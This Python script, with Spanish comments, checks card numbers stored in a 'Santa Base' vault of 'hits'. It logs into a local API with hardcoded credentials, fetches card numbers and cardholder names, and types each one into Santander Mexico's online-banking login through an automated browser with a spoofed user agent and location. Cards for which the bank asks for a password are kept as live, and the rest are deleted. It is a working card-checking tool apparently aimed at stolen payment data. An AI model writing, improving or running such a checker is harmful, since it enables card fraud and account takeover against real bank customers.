"""Limpieza de bóveda: borra automáticamente los registros que no pasen el check web.

- Solo marca OFF los que no son clientes reales (dummy o error).
- Los que pasan el check web se quedan como están (no se tocan).
- No marca card_verified ni notas (sin ruido).
- Corre en background, headful, directo, sin proxy.

Uso: python scripts/clean_vault.py
"""
import json
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from playwright.sync_api import sync_playwright  # noqa: E402

URL = "https://santanderweb.santander.com.mx/public/ts/login/"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36")

API = "http://localhost:8055"
API_USER = "Robertvs"
API_PASS = "Kashau2022"


def api_login():
    """Devuelve el token de sesión."""
    import urllib.request
    req = urllib.request.Request(
        f"{API}/api/auth/login",
        data=json.dumps({"username": API_USER, "password": API_PASS}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req) as r:
        d = json.loads(r.read())
    return d["token"]


def api_get_cards(token):
    """Trae todas las tarjetas de la bóveda (paginando)."""
    import urllib.request
    cards = []
    for page in range(1, 20):
        req = urllib.request.Request(
            f"{API}/api/hits?limit=100&page={page}",
            headers={"Cookie": f"santabase_session={token}"},
        )
        with urllib.request.urlopen(req) as r:
            d = json.loads(r.read())
        for h in d["hits"]:
            cards.append({"id": h["id"], "card": h["u6acct"], "name": h["dmname"]})
        if page >= d["total_pages"]:
            break
    return cards


def check_one(card, browser):
    """Verifica una tarjeta. Devuelve (estado, user_id, detalle)."""
    ctx = browser.new_context(
        user_agent=UA, locale="es-MX",
        viewport={"width": 1920, "height": 1080},
        geolocation={"latitude": 20.78770839612377, "longitude": -103.46146732811971},
        permissions=["geolocation"],
    )
    page = ctx.new_page()
    visto = {}

    def on_response(resp):
        u = resp.url
        for tag, path in (("invoke", "/tsm/api/v2/auth/anonymous_invoke"),
                          ("assert", "/tsm/api/v2/auth/assert"),
                          ("login", "/tsm/api/v2/auth/login")):
            if path in u and tag not in visto:
                try:
                    visto[tag] = json.loads(resp.text())
                except Exception:
                    visto[tag] = None

    page.on("response", on_response)
    t0 = time.time()
    try:
        page.goto(URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(7.0)

        campo = page.locator("#buc-input").first
        campo.wait_for(state="visible", timeout=15000)
        campo.click()
        campo.fill("")
        campo.type(card, delay=55)
        time.sleep(0.8)
        campo.press("Enter")

        # Esperar la respuesta de auth/login (o assert) sin depender de page.wait_for_timeout
        for _ in range(28):
            time.sleep(0.5)
            if "login" in visto:
                break
            if "assert" in visto and visto["assert"] is not None:
                time.sleep(1.0)
                if "login" in visto:
                    break

        d = ((visto.get("assert") or {}).get("data") or {})
        state = d.get("state", "")
        uid = ((d.get("data") or {}).get("redirect") or {}).get("target", {}).get("user_id", "")
        dur = round(time.time() - t0, 1)

        # REGLA EXACTA: Solo es HIT si llega a pedir contraseña.
        # Si arroja "you_cannot_continue", SuperLínea o cualquier error, se descarta.
        login_data = visto.get("login") or {}
        ctrl_flow = (login_data.get("data") or {}).get("control_flow") or []
        form_str = ""
        for cf in ctrl_flow:
            form_str = (cf.get("strings") or {}).get("form") or ""
            if form_str:
                break

        if "password_authenticate_form" in form_str:
            return ("ACTIVE", uid, f"pide password ({dur}s)")

        # Cualquier otra cosa (you_cannot_continue, error, bloqueo) NO es hit
        return ("INACTIVE", uid, f"no pide password / bloqueada ({dur}s)")
    except Exception as ex:
        return ("ERROR", "", f"{str(ex).splitlines()[0][:60]} ({round(time.time()-t0,1)}s)")
    finally:
        try:
            ctx.close()
        except Exception:
            pass


def _get_browser(p, current_browser=None):
    if current_browser is not None:
        try:
            if current_browser.is_connected():
                return current_browser
        except Exception:
            pass
        try:
            current_browser.close()
        except Exception:
            pass
    return p.chromium.launch(
        headless=False,
        args=["--window-position=1900,0", "--window-size=1000,800"],
    )


def main():
    print("[*] Limpieza de bóveda Santa Base", flush=True)
    token = api_login()
    print(f"[+] Autenticado como {API_USER}", flush=True)

    cards = api_get_cards(token)
    print(f"[+] {len(cards)} registros en bóveda", flush=True)

    # Resumen
    active = 0
    inactive = 0
    errors = 0

    with sync_playwright() as p:
        browser = _get_browser(p)
        for i, rec in enumerate(cards):
            raw_card = str(rec.get("card") or "")
            card = "".join(c for c in raw_card if c.isdigit())[:16]
            if len(card) < 16:
                estado, uid, det = "INACTIVE", "", "tarjeta invalida / incompleta"
            else:
                browser = _get_browser(p, browser)
                estado, uid, det = check_one(card, browser)

            tag = "OK" if estado == "ACTIVE" else ("NO" if estado == "INACTIVE" else "?")
            print(f"[{i+1:3d}/{len(cards)}] {tag} ...{card[-4:] if len(card)>=4 else '????'} {estado:9s}  {det}", flush=True)

            if estado == "ACTIVE":
                active += 1
            elif estado == "INACTIVE":
                inactive += 1
                # Marcar como OFF → el endpoint borra el registro automáticamente
                try:
                    import urllib.request
                    req = urllib.request.Request(
                        f"{API}/api/hits/{rec['id']}",
                        data=json.dumps({"work_status": "OFF"}).encode(),
                        headers={"Content-Type": "application/json",
                                 "Cookie": f"santabase_session={token}"},
                        method="PUT",
                    )
                    urllib.request.urlopen(req)
                except Exception as ex:
                    print(f"    WARN: no pude borrar hit {rec['id']}: {ex}")
            else:
                errors += 1

            time.sleep(3)

        browser.close()

    print(f"\n[*] RESULTADO: {active} ACTIVE (quedan) | {inactive} INACTIVE (borrados) | {errors} ERROR")
    print("[*] Los INACTIVE fueron borrados automáticamente de la bóveda.")


if __name__ == "__main__":
    main()